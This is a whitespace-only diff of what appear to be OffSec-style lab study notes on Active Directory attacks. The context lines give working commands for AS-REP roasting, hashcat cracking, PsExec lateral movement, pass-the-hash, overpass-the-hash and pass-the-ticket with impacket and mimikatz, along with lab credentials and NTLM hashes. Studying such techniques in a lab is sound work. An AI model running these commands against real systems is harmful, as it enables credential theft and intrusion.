@@ -4502,7 +4502,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     ```
 - capstone access to DC1 (AS-REP roasting 'mike' + password spray (client75 admin) + mimikatz for maria)
   - Find Vulnerable Users Does not require Kerberos preauthentication on DC  
-    `impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete` (Not working) OR
+    `impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete` (Not working) OR  
     `impacket-GetNPUsers -dc-ip 192.168.158.70 corp.com/pete:Nexus123! -request -outputfile hashes2.asreproast`  
   - Cracking the AS-REP hash with Hashcat > mike:Darkness1099! (Rules: add nothing, 1, or !)  
     ```
@@ -4620,22 +4620,22 @@ offsec:lab (admin)
     PS C:\Windows\system32> 
     ```
 - PsExec  
-  - **offsec(admin)**:client74 --> web04
+  - **offsec(admin)**:client74 --> web04  
     `xfreerdp3 /u:offsec /p:lab /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share` (avoid using (d) for RDP as the user has local admin)  
-  - Using PsExec laterally move to another host (web04) and open a remote cmd.exe
+  - Using PsExec laterally move to another host (web04) and open a remote cmd.exe  
     `PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd`  
 - Pass the Hash
-  - **Administrator** move laterally to web04 from kali (stolen hash)
+  - **Administrator** move laterally to web04 from kali (stolen hash)  
     `kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  
 - Overpass the Hash
-  - **jeff**:client76 --> web04
+  - **jeff**:client76 --> web04  
     `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`  
   - run a process as **jen:Nexus123!** (Shift right click run as different user)  
   - dump logon password  
     `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > samdump.txt`
   - Connect to CLIENT76 as **'offsec' (admin)**
     `xfreerdp3 /u:offsec /p:lab /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`  
-  - Inject NTLM hash (**jen**) into a fake logon session (OverPass-the-Hash)
+  - Inject NTLM hash (**jen**) into a fake logon session (OverPass-the-Hash)  
     `C:\tools>.\mimikatz.exe "sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell" exit`  
   - Map network resource access web04  
     `PS C:\Windows\system32> net use \\web04`
@@ -4644,13 +4644,13 @@ offsec:lab (admin)
   - Using PsExec to access web04
     `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\web04 cmd`  
 - Pass the ticekts
-  - **jen**:client76 --> web04
+  - **jen**:client76 --> web04  
     `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`
   - exporting Kerberos tickets  
     `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit`  
   - listing all Kerberos ticket files  
     `PS C:\Tools> dir *.kirbi`  
-  - injecting a Kerberos ticket into your current session to authenticate as the user in the ticket without needing a password
+  - injecting a Kerberos ticket into your current session to authenticate as the user in the ticket without needing a password  
     `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
   - `PS C:\Tools> type ls \\web04\backup\flag.txt`
 - DCOM
